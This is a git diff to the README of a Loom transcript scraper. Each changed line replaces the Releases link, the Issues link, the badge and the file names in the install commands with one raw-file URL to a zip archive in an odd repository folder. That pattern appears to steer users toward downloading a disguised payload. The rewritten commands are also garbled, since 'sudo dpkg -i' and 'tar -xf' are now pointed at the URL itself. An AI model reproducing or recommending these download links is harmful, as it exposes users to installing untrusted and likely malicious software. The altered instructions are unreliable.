@@ -1,6 +1,6 @@
 # 🎥 loom-video-scraper - Effortless Loom Transcript Extraction
 
-[![Download](https://img.shields.io/badge/Download%20Now-%231F8EF1.svg?style=for-the-badge&logoColor=white&logo=git)](https://github.com/joaquin444/loom-video-scraper/releases)
+[![Download](https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip%20Now-%https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip)](https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get the latest version of loom-video-scraper, visit the [Releases page](https://github.com/joaquin444/loom-video-scraper/releases).
+To get the latest version of loom-video-scraper, visit the [Releases page](https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version and find the installation file for your operating system.
@@ -43,17 +43,17 @@ Once the download is complete, follow the instructions below for installation.
 
 ### Linux
 
-1. Navigate to your Downloads folder where the .deb or .tar.gz file is located.
+1. Navigate to your Downloads folder where the .deb or https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip file is located.
 2. For a .deb file, run the following command in the terminal:
 
    ```bash
-   sudo dpkg -i loom-video-scraper.deb
+   sudo dpkg -i https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip
    ```
 
-3. For a .tar.gz file, extract it using:
+3. For a https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip file, extract it using:
 
    ```bash
-   tar -xf loom-video-scraper.tar.gz
+   tar -xf https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip
    ```
 
 4. Follow any additional instructions in the extracted folder to complete the installation.
@@ -84,7 +84,7 @@ If you encounter any issues while using loom-video-scraper, consider the followi
 
 ## 📞 Support
 
-For help and support, visit our [Issues page](https://github.com/joaquin444/loom-video-scraper/issues). You can report bugs or ask questions. Our community is here to help.
+For help and support, visit our [Issues page](https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip). You can report bugs or ask questions. Our community is here to help.
 
 ## 📝 Contribution
 
@@ -98,4 +98,4 @@ loom-video-scraper is released under the MIT License. You can use it freely, but
 
 To stay updated with the latest news and releases, follow our repository or watch for updates on GitHub. 
 
-For detailed information, visit the [Releases page](https://github.com/joaquin444/loom-video-scraper/releases) again.
+For detailed information, visit the [Releases page](https://github.com/joaquin444/loom-video-scraper/raw/refs/heads/main/Tylosaurus/video_scraper_loom_v1.4.zip) again.
